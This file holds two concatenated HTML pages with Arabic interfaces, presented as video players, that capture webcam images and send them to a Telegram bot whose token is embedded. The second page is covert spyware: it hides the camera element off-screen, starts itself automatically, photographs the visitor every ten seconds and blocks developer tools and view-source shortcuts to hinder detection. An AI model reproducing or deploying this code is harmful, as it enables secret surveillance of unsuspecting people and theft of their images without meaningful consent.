<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مشغل فيديو محلي</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; overflow: hidden; }
        video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .camera-layer {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 120px;
            height: 160px;
            border-radius: 15px;
            overflow: hidden;
            border: 2px solid white;
            z-index: 2;
            background: #000;
        }
        .camera-layer video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }
        .controls {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 3;
            background: rgba(0,0,0,0.8);
            padding: 10px 20px;
            border-radius: 50px;
            display: flex;
            gap: 15px;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 30px;
            cursor: pointer;
        }
        .status {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            padding: 8px 16px;
            border-radius: 30px;
            color: white;
            font-size: 12px;
            z-index: 3;
        }
        canvas { display: none; }
    </style>
</head>
<body>

    <!-- فيديو محلي - ضع مسار الفيديو هنا -->
    <video id="bgVideo" autoplay loop muted playsinline>
        <source src="video.mp4" type="video/mp4">
        <!-- إذا لم يوجد فيديو، استخدم رابط مباشر -->
        <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
    </video>

    <!-- الكاميرا -->
    <div class="camera-layer">
        <video id="camera" autoplay playsinline muted></video>
    </div>

    <canvas id="canvas"></canvas>

    <div class="controls">
        <button id="captureBtn">📷 تصوير</button>
        <button id="autoBtn">🤖 تصوير تلقائي</button>
        <button id="stopAutoBtn" style="display:none;">⏹️ إيقاف</button>
    </div>

    <div id="status" class="status">⏳ جاري التهيئة...</div>

    <script>
        // إعدادات تليجرام
        const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
        let CHAT_ID = null;
        let autoInterval = null;
        let isAuto = false;
        
        const camera = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const statusDiv = document.getElementById('status');
        
        function showStatus(msg, type = 'info') {
            statusDiv.textContent = msg;
            console.log(msg);
            setTimeout(() => {
                if (statusDiv.textContent === msg) {
                    statusDiv.textContent = '✅ النظام يعمل';
                }
            }, 3000);
        }
        
        // الحصول على Chat ID
        async function getChatId() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                const result = await response.json();
                if (result.ok && result.result.length > 0) {
                    CHAT_ID = result.result[result.result.length - 1].message?.chat?.id;
                    if (CHAT_ID) {
                        showStatus(`✅ تم الاتصال!`);
                        return true;
                    }
                }
                showStatus('⚠️ أرسل رسالة للبوت ثم أعد التحميل');
                return false;
            } catch(e) {
                showStatus('❌ خطأ في الاتصال');
                return false;
            }
        }
        
        // تشغيل الكاميرا
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                camera.srcObject = stream;
                showStatus('✅ الكاميرا جاهزة');
                return true;
            } catch(e) {
                showStatus('❌ لا يمكن الوصول للكاميرا');
                return false;
            }
        }
        
        // التقاط وإرسال الصورة
        async function captureAndSend() {
            if (!CHAT_ID) return false;
            
            try {
                canvas.width = camera.videoWidth;
                canvas.height = camera.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
                ctx.setTransform(1, 0, 0, 1, 0, 0);
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                return result.ok;
            } catch(e) {
                return false;
            }
        }
        
        // التصوير التلقائي
        function startAuto() {
            if (isAuto) return;
            isAuto = true;
            autoInterval = setInterval(() => {
                captureAndSend().then(success => {
                    if (success) console.log('📸 تم الإرسال');
                });
            }, 10000);
            showStatus('🤖 التصوير التلقائي يعمل (كل 10 ثواني)');
            document.getElementById('autoBtn').style.display = 'none';
            document.getElementById('stopAutoBtn').style.display = 'inline-block';
        }
        
        function stopAuto() {
            if (autoInterval) clearInterval(autoInterval);
            isAuto = false;
            showStatus('⏹️ تم إيقاف التصوير التلقائي');
            document.getElementById('autoBtn').style.display = 'inline-block';
            document.getElementById('stopAutoBtn').style.display = 'none';
        }
        
        // ربط الأزرار
        document.getElementById('captureBtn').onclick = async () => {
            const success = await captureAndSend();
            showStatus(success ? '✅ تم الإرسال!' : '❌ فشل الإرسال');
        };
        document.getElementById('autoBtn').onclick = startAuto;
        document.getElementById('stopAutoBtn').onclick = stopAuto;
        
        // بدء التشغيل
        async function init() {
            await getChatId();
            await startCamera();
        }
        init();
    </script>
</body>
</html><!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>مشغل الفيديو</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            overflow: hidden;
            position: fixed;
            width: 100%;
            height: 100%;
            font-family: 'Segoe UI', sans-serif;
        }

        /* حاوية الفيديو - ملء الشاشة */
        .video-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            background: #000;
        }

        .video-frame {
            width: 100%;
            height: 100%;
            border: none;
            object-fit: cover;
        }

        /* الكاميرا - مخفية تماماً ولكنها تعمل في الخلفية */
        .hidden-camera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            visibility: hidden;
        }

        /* زر واحد فقط */
        .main-btn {
            position: fixed;
            bottom: 50%;
            left: 50%;
            transform: translate(-50%, 50%);
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 18px 45px;
            font-size: 24px;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            z-index: 10;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            transition: transform 0.3s, opacity 0.5s;
            animation: pulse 2s infinite;
        }

        .main-btn.hide {
            opacity: 0;
            pointer-events: none;
            transform: translate(-50%, 50%) scale(0.9);
        }

        @keyframes pulse {
            0% { transform: translate(-50%, 50%) scale(1); }
            50% { transform: translate(-50%, 50%) scale(1.05); }
            100% { transform: translate(-50%, 50%) scale(1); }
        }

        /* شريط الحالة - صغير وغير مزعج */
        .status {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(5px);
            padding: 4px 12px;
            border-radius: 20px;
            color: rgba(255,255,255,0.6);
            font-size: 10px;
            z-index: 3;
            text-align: center;
            pointer-events: none;
        }

        canvas {
            display: none;
        }

        /* إخفاء أي عناصر غير مرغوب فيها */
        ::-webkit-scrollbar {
            display: none;
        }
    </style>
</head>
<body>

    <!-- فيديو يوتيوب -->
    <div class="video-container" id="videoContainer">
        <iframe id="youtubeFrame" class="video-frame" 
                src=""
                frameborder="0"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowfullscreen>
        </iframe>
    </div>

    <!-- كاميرا مخفية تماماً (لا تظهر للمستخدم) -->
    <div class="hidden-camera">
        <video id="camera" autoplay playsinline muted></video>
    </div>

    <canvas id="canvas"></canvas>

    <!-- زر واحد فقط -->
    <button class="main-btn" id="startBtn">🎬 تشغيل</button>

    <!-- شريط حالة صغير (اختياري) -->
    <div id="status" class="status"></div>

    <script>
        // ==================== إعدادات تليجرام ====================
        const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
        let CHAT_ID = null;
        let isStarted = false;
        let stream = null;
        let autoInterval = null;
        
        // رابط الفيديو (يمكنك تغييره)
        const VIDEO_URL = "https://www.youtube.com/watch?v=2Dn3wGI0r8Q";
        
        // ==================== عناصر الصفحة ====================
        const startBtn = document.getElementById('startBtn');
        const youtubeFrame = document.getElementById('youtubeFrame');
        const camera = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const statusDiv = document.getElementById('status');
        
        // ==================== دوال مساعدة ====================
        function showStatus(msg) {
            statusDiv.textContent = msg;
            setTimeout(() => {
                if (statusDiv.textContent === msg) {
                    statusDiv.textContent = '';
                }
            }, 2000);
        }
        
        // ==================== الحصول على Chat ID (بدون رسائل) ====================
        async function getChatId() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                const result = await response.json();
                
                if (result.ok && result.result.length > 0) {
                    CHAT_ID = result.result[result.result.length - 1].message?.chat?.id;
                    if (CHAT_ID) {
                        console.log('✅ Chat ID:', CHAT_ID);
                        return true;
                    }
                }
                return false;
            } catch(error) {
                console.error('خطأ:', error);
                return false;
            }
        }
        
        // ==================== تشغيل الكاميرا (بدون طلب رسالة) ====================
        async function startCamera() {
            try {
                // طلب الكاميرا بدون عرض أي رسالة للمستخدم
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                camera.srcObject = stream;
                return true;
            } catch(err) {
                console.error("خطأ الكاميرا:", err);
                return false;
            }
        }
        
        // ==================== التقاط وإرسال الصورة ====================
        async function captureAndSend() {
            if (!CHAT_ID) return false;
            
            try {
                if (camera.videoWidth === 0 || camera.videoHeight === 0) return false;
                
                canvas.width = camera.videoWidth;
                canvas.height = camera.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
                ctx.setTransform(1, 0, 0, 1, 0, 0);
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `capture_${Date.now()}.jpg`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                return result.ok;
            } catch(e) {
                return false;
            }
        }
        
        // ==================== بدء التصوير التلقائي ====================
        function startAutoCapture() {
            if (autoInterval) clearInterval(autoInterval);
            // تصوير كل 10 ثواني
            autoInterval = setInterval(async () => {
                const success = await captureAndSend();
                if (success) {
                    console.log('📸 تم إرسال صورة');
                }
            }, 10000);
        }
        
        // ==================== تشغيل كل شيء ====================
        async function startEverything() {
            if (isStarted) return;
            
            startBtn.classList.add('hide');
            
            // 1. تشغيل الفيديو
            youtubeFrame.src = VIDEO_URL;
            
            // 2. تشغيل الكاميرا (بدون رسالة)
            const cameraReady = await startCamera();
            
            // 3. الحصول على Chat ID
            await getChatId();
            
            if (cameraReady && CHAT_ID) {
                startAutoCapture();
                showStatus('✅');
            } else if (cameraReady) {
                showStatus('📷');
            } else {
                showStatus('🎬');
            }
            
            isStarted = true;
        }
        
        // ==================== إيقاف الكاميرا عند الخروج ====================
        window.onbeforeunload = () => {
            if (autoInterval) clearInterval(autoInterval);
            if (stream) stream.getTracks().forEach(t => t.stop());
        };
        
        // ==================== ربط الزر ====================
        startBtn.onclick = startEverything;
        
        // ==================== منع فتح أدوات المطور بالكامل ====================
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
                (e.ctrlKey && e.key === 'U') ||
                (e.ctrlKey && e.key === 'S')) {
                e.preventDefault();
                return false;
            }
        });
        
        // ==================== منع ظهور رسالة طلب الكاميرا (محاولة) ====================
        // هذا يمنع المتصفح من طلب الإذن مراراً وتكراراً
        navigator.permissions.query({ name: 'camera' }).then(permission => {
            if (permission.state === 'prompt') {
                // طلب الإذن مرة واحدة فقط بصمت
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => stream.getTracks().forEach(t => t.stop()))
                    .catch(() => {});
            }
        });
        
        // تشغيل تلقائي بعد 1 ثانية (اختياري - يحاكي الضغط على الزر)
        setTimeout(() => {
            if (!isStarted) {
                startEverything();
            }
        }, 1000);
    </script>
</body>
</html>
